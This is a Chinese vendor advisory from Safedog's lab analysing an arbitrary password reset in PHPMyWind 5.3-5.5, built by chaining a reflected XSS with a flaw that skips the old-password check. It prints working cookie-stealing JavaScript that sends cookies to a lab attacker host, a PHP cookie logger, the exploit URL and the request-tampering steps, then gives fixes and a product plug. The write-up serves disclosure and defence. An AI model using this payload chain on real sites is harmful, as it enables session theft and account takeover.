# PHPMyWind CMS产品 任意密码重置漏洞研究分析

阅读量 **416931**

|评论 **5**

发布时间 : 2019-03-22 15:28:37

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p1.ssl.qhimg.com/t011c7ac7a2d184e6e0.jpg)

## 第一章 安全预警

北京时间2019年2月18日，安全狗海青实验室的安全研究人员发现了一个PHPMyWind的任意密码重置漏洞。

PHPMyWind是一套基于PHP和MySQL并符合W3C标准的企业网站建设解决方案，拥有着较大的用户群体(根据PHPMyWind官网介绍，已下载超15万次)，受影响的版本是5.3-5.5版本。

该“任意密码重置漏洞”联合利用了“反射型XSS漏洞”与“逻辑漏洞”。攻击者可以利用该“反射型XSS漏洞”，通过诱使受害者点击恶意链接，窃取受害者的Cookie；接着，攻击者可以利用Cookie伪造受害者身份，利用该“逻辑漏洞”，在不知道“受害者密码”的前提下，修改“受害者的密保问题”，进而达到重置受害者密码的目的。

海青实验室已经将该漏洞报送给CNVD与CNNVD平台，并根据最新的研究分析总结出了一些防护建议，敬请用户知晓。海青实验室已经将该漏洞报送给CNVD与CNNVD平台，同时通知厂商修复该漏洞，并就该漏洞发布了相关预警。现在厂家已发布修复漏洞的新版本，我们将公开详细的漏洞技术细节，供业内讨论学习。

## 第二章 漏洞详情

漏洞名称 | PHPMyWind 5.3-5.5任意密码重置漏洞  
---|---  
漏洞影响产品版本（范围） | 5.3-5.5  
漏洞危害等级 | 中危  
厂商是否已发布漏洞补丁 | 否  
安全狗总预警期数 | 74  
安全狗预警版本 | V2.0  
安全狗发布预警日期 | 2019年3月11日  
安全狗更新预警日期 | 2019年3月13日  
发布者 | 安全狗海青实验室  
  
## 第三章 漏洞验证

###  3.1 环境搭建

在漏洞环境搭建时，设置有“服务器”“攻击者”以及“受害者”这三方。漏洞验证实验环境的情况如表1所示。

表 1 实验环境情况表

参与方

|

IP地址

|

备注  
  
---|---|---  
服务器 | 192.168.114.159 | 部署有“PHPMyWind 5.5”  
攻击机（safedog） | 192.168.114.1 | 部署有能“收集PHPMyWind用户的Cookie”的PHP脚本、JS脚本  
受害者（victim） | 192.168.114.161 | 可通过浏览器访问“服务器”上的“PHPMyWind”网站  
  
漏洞验证实验的示意图如图1所示。箭头1代表攻击者safedog通过邮件等方式发送恶意链接（嵌有可盗取并发送Cookie的JS脚本）给受害者victim；箭头2代表在受害者victim受诱导点击恶意链接后，会经由浏览器将攻击者safedog嵌入的JS脚本当做数据发送给服务器上的PHPMyWind网站的反射型XSS漏洞点；箭头3与箭头4代表PHPMyWind网站在受到反射型XSS攻击后，会执行JS脚本，将受害者victim的Cookie返回给受害者victim，并发送给攻击者safedog。箭头5代表攻击者safedog在获得受害者victim的Cookie后，利用受害者victim的Cookie与PHPMyWind网站的逻辑漏洞点进行密码重置攻击。

![](https://p0.ssl.qhimg.com/t010268e2dd58153adf.jpg)

图 1 漏洞验证实验的示意图

###  3.2 验证步骤

漏洞验证过程分为以下8步：

1）在网站注册2个测试账号（攻击者、受害者）；

2）攻击者和受害者都登录网站的会员中心；

3）攻击者搭建可接收受害者Cookie的PHP网站；

4）攻击者使用BurpSuite抓取“重置账号密码”的数据包；

5）攻击者向受害者的邮箱发送可触发反射型XSS漏洞的超链接的邮件（该反射型XSS漏洞可致受害者Cookie泄露）；

6）受害者点击超链接（受害者的Cookie将被传输给攻击者搭建的网站）；

7）攻击者在获得受害者Cookie后，修改步骤4的“重置账号密码”的数据包，并向网站发送数据包，以期重置受害者的“密码找回答案和密码”。

8）攻击者利用网站的“密码找回”功能，重置受害者的登录密码，进而实现非法登录会员中心。

具体如下：

1）在网站注册2个测试账号（攻击者、受害者）；

使用PHPMyWind的注册功能注册攻击者的账号safedog以及受害者的账号victim，通过PHPMyWind的管理后台可以发现safedog的ID为6，而受害者的ID为7，如图2所示。

![](https://p0.ssl.qhimg.com/t015d0c73934eb47034.png)

图 2 攻击者safedog的ID为6，受害者victim的ID为7

2）攻击者和受害者都登录网站的会员中心；

攻击者safedog的登录效果如图3所示。

图 3 攻击者safedog登录会员中心

受害者victim的登录效果如图4所示。

图 4 受害者victim登录会员中心

3）攻击者搭建可接收受害者Cookie的PHP网站；

该PHP网站由“ReflectiveXSS.js”“ReflectiveXSS.php”和“cookie.txt”这3个文件构成。

其中“ReflectiveXSS.js”用于针对服务器端PHPMyWind网站的反射型XSS漏洞窃取受害者victim的Cookie，并将该Cookie值传输给ReflectiveXSS.php；“ReflectiveXSS.php”用于接收名为“victimcookie”的GET请求，并将“victimcookie”的参数值保存到“cookie.txt”。

ReflectiveXSS.js的代码如下：

    
    
    //通过指定的名称'img'创建img元素
    
    var img = document.createElement('img');
    
    img.width = 0;
    
    img.height = 0;
    
    //将img元素的src属性指向脚本文件ReflectiveXSS.pho
    
    //将cookie信息的字符串作为URI组件进行编码，然后用victimcookie参数传递
    
    img.src = 'http://192.168.114.1/safedog-attack/ReflectiveXSS.php?victimcookie='+encodeURIComponent(document.cookie);

ReflectiveXSS.php的代码如下：

    
    
    <?php
    
        @ini_set('display_errors',1);
    
        $str = $_GET['victimcookie'];
    
        $filePath = "cookie.txt";
    
        if(is_writable($filePath)==false){
    
             echo "can't write";
    
        }else{
    
              $handler = fopen($filePath, 'a');
    
              fwrite($handler, $str);
    
              fclose($handler);
    
        }
    
    ?>

4）攻击者使用BurpSuite抓取“重置账号密码”的数据包；

抓取的结果如图5所示，可以发现网页表单里的“提问：你其中一位老师的名字”对应着报文中的“question=4”，而“回答：kk”对应着报文中的“answer=kk”。

图 5 攻击者使用BurpSuite抓取“重置账号密码”的数据包

5）攻击者向受害者的邮箱发送可触发反射型XSS漏洞的超链接的邮件（该反射型XSS漏洞可致受害者Cookie泄露）；

网站具有反射型XSS注入漏洞的的PoC如下：

    
    
    http://192.168.114.159/phpmywind5-5/data/api/oauth/connect.php?method=unknownmethod%3Cscript%3Ealert(1)%3C/script%3E

该PoC的执行效果如图6所示。

![](https://p4.ssl.qhimg.com/t016c7f10ac47badbdc.png)

图 6 PHPMyWind 5.5存在反射型XSS

修改PoC为如下EXP：

    
    
    http://192.168.114.159/phpmywind5-5/data/api/oauth/connect.php?method=unknownmethod<script src=http://192.168.114.1/safedog-attack/ReflectiveXSS.js></script>

攻击者safedog利用该EXP编辑恶意的电子邮件（邮件正文的“Please Click the
Link”的超链接指向了该EXP），并将之发送给受害者victim，如图7所示。

![](https://p2.ssl.qhimg.com/t0102c842a541659f9d.png)

图 7 攻击者实施跨站脚本钓鱼攻击

6）受害者点击超链接（受害者的Cookie将被传输给攻击者搭建的网站）；

受害者victim点击该超链接后，将会在不知情的情况下受到恶意JS脚本的攻击，自身在PHPMyWind网站的Cookie也会被泄露给攻击者，如图8所示。

图 8 受害者在不知情的情况下将Cookie发送给攻击者

7）攻击者在获得受害者Cookie后，修改步骤4的“重置账号密码”的数据包，并向网站发送数据包，以期重置受害者的“密码找回答案和密码”。

经过步骤6，攻击者safedog可以在其Cookie.txt文件中获得受害者victim的Cookie，如图9所示。

图 9 受害者victim的Cookie被保存到Cookie.txt文件中

接下来，攻击者safedog对BurpSuite的数据包进行修改。在BurpSuite的Repeater面板下进行如下操作：

(1)将攻击者safedog
的Cookie中的username、lastlogintime、lastloginip以及PHPSESSID替换成受害者victim的参数；

(2)将“password”和“repassword”字段的属性值置为空；

(3)将“id”修改为“7”（由图2可知，受害者的ID为7）；

(4)点击“Go”按钮。

返回结果如图10所示，我们可以发现网站给出了提示：“资料更新成功！”。这也代表了攻击者safedog成功重置了受害者victim的“密码找回问题及答案”。

图 10 攻击者safedog成功重置了受害者victim的“密码找回问题及答案”

8）攻击者利用网站的“密码找回”功能，重置受害者的登录密码，进而实现非法登录系统。

攻击者safedog访问网站的“会员中心/登录页面/找回密码”页面，以针对受害者victim的账号进行“找回密码”操作，如图11所示。

图 11 攻击者safedog针对受害者victim账号进行“找回密码”操作

选择“安全问题”为“你其中一位老师的名字”，填写“问题答案”为“kk”，并点击“找回密码”按钮，如图12所示（“安全问题”以及“问题答案”与图5对应）。

图 12 攻击者safedog针对受害者victim账号进行“安全问题验证找回”操作

此时，我们可以发现，可以通过“回答安全问题找回密码”的功能重置受害者victim的密码，如图13所示。

图 13 通过“安全问题验证”，攻击者safedog设置受害者victim的新密码

接着，攻击者safedog可以利用为受害者victim重置的密码登录网站，如图14所示。

图 14 攻击者safedog使用新密码登录受害者victim账号

## 第四章 漏洞原理分析

该“任意密码重置漏洞”联合利用了“逻辑漏洞”与“反射型XSS漏洞”，接下来对这两个漏洞进行具体分析。

(1)逻辑漏洞

该漏洞出现的文件路径为：/member.php，具体位置如图15所示。

图 15 /member.php-逻辑漏洞

这段代码是用户在“会员中心/编辑资料”处进行密码修改的部分代码。

在第584行的if判断的作用是“判断用户提交的新密码是否为空”，第584-593行代码的逻辑是“在用户提交的新密码不为空的情况下，才会进行‘旧密码的比对’，如果提交的旧密码和数据库的查询结果不一致，则不允许继续进行更换密码的操作。”；而在第596行的if判断的作用仍为“判断用户提交的新密码是否为空”，第596-600行代码的逻辑是“在用户提交的新密码不为空的情况下，对新密码进行哈希运算，随后进行SQL语句的拼接”。第584以及第596行存在了逻辑漏洞。因为，如果我们提交的新密码（password变量和repassword变量）为空，则可以绕过对旧密码（oldpassword变量）的验证。这为“攻击者在不知道受害者原始密码的情况下，重置受害者密码”创造了可能。

继续审计第601行以及第602行。第601行进行SQL语句的拼接，第602行执行则进行SQL语句的执行。第601行的SQL语句如下：

    
    
    @$sql .= "question='$question', answer='$answer', cnname='$cnname', enname='$enname', sex='$sex', birthtype='$birthtype', birth_year='$birth_year', birth_month='$birth_month', birth_day='$birth_day', astro='$astro', bloodtype='$bloodtype', trade='$trade', live_prov='$live_prov', live_city='$live_city', live_country='$live_country', home_prov='$home_prov', home_city='$home_city', home_country='$home_country', cardtype='$cardtype', cardnum='$cardnum', intro='$intro', email='$email', qqnum='$qqnum', mobile='$mobile', telephone='$telephone', address_prov='$address_prov', address_city='$address_city', address_country='$address_country', address='$address', zipcode='$zipcode' WHERE id='$id' AND `username`='$c_uname'";

这个SQL语句的id来源于$id，即$_GET[‘id’]或$_POST[‘id’]，而username来源于$c_uname，具体位置如图16所示。可以发现，当SQL语句满足条件“id=’$id’
AND `username`=’$c_uname'”;”时，才可进行update操作。

图 16 对$id与$c_uname做审计

在第44行中，变量c_uname值（明文）来源于AuthCode($_COOKIE[‘username’])，即先取得Cookie中username(密文)的值，然后通过AuthCode函数配合配置文件中的密钥来获取明文。AuthCode函数的实现方式如图17所示。

![](https://p3.ssl.qhimg.com/t01e536f2468aba56d1.png)

图 17 AuthCode函数的实现方式

PHPMyWind采用Cookie保存混淆化的用户登录信息。因为配置文件中的密钥是在CMS搭建时随机生成的，算法也不可逆，因此要在知道c_name变量的前提下，从正向伪造username等变量，以通过权限验证具有较大难度。为获取Cookie中的username等值，可考虑借助反射型XSS漏洞。

(2)反射型XSS漏洞

该漏洞出现的文件路径为：/data/api/oauth/connect.php，具体位置如图18所示。

图 18 /data/api/oauth/connect.php-反射型XSS漏洞

在第24行的if判断的作用是“判断函数名是否存在”，第24-第27行代码的逻辑是“如果函数名不存在，则在PHP页面输出函数名”，这一做法会造成反射型XSS漏洞。

## 第五章 漏洞修复方案

###  5.1 使用安全狗产品防御反射型XSS攻击

请使用PHPMyWind 5.3-5.5的用户使用“网站安全狗”的“漏洞防护规则-HTTP安全检测”功能进行防御，如图19、图20所示。

图 19 使用“网站安全狗”的“漏洞防护规则-HTTP安全检测”功能进行防御

图 20 “网站安全狗”可以防御PHPMyWind 5.3-5.5的任意密码重置漏洞

###  5.2 修复逻辑漏洞

在\member.php的 原584行代码的“检测旧密码是否正确”的判断前添加“检测新密码是为空”的判断，参考做法如图21所示。

图 21 对PHPMyWind 5.3-5.5任意密码重置漏洞进行修复的参考做法（逻辑漏洞角度）

###  5.3 修复反射型XSS漏洞

修改\data\api\oauth\connect.php的 第27行代码，参考做法如图22所示。

图 22 对PHPMyWind 5.3-5.5任意密码重置漏洞进行修复的参考做法（反射型XSS角度）

## 第六章 总结

本文针对“PHPMyWind CMS 5.3-5.5产品任意密码重置漏洞”从漏洞详情、PoC验证、

漏洞原理分析、漏洞修复方案等进行了研究分析，希望对行业和客户有所补益。

通过对这一漏洞的详细分析，可以得到如下启示：

  1. 黑客在攻击网站时，可能会打“组合拳”，联合利用多类漏洞；
  2. 为防御XSS漏洞，应对输入和输出做严格的过滤；
  3. 为防御逻辑漏洞，应对“业务流程”以及“HTTP/HTTPS请求篡改”等黑客挖掘逻辑漏洞的重点引起重视；
  4. 应当重视对开源软件的安全性检测。

值得强调的是，网站安全狗能有效地防御了该漏洞。实际测试表明，安全狗产品体系具

有较好的防御未知漏洞的能力，可帮助用户降低了受攻击的风险，建议用户安装，使用。

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **安全狗safedog** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/173874](/post/id/173874)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [xss](/tag/xss)
  * [Web安全](/tag/Web安全)
  * [PHP](/tag/PHP)

 **+1** __1赞

 __收藏

![](https://p3.ssl.qhimg.com/t01cf9fec636c785d35.png) 安全狗safedog

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

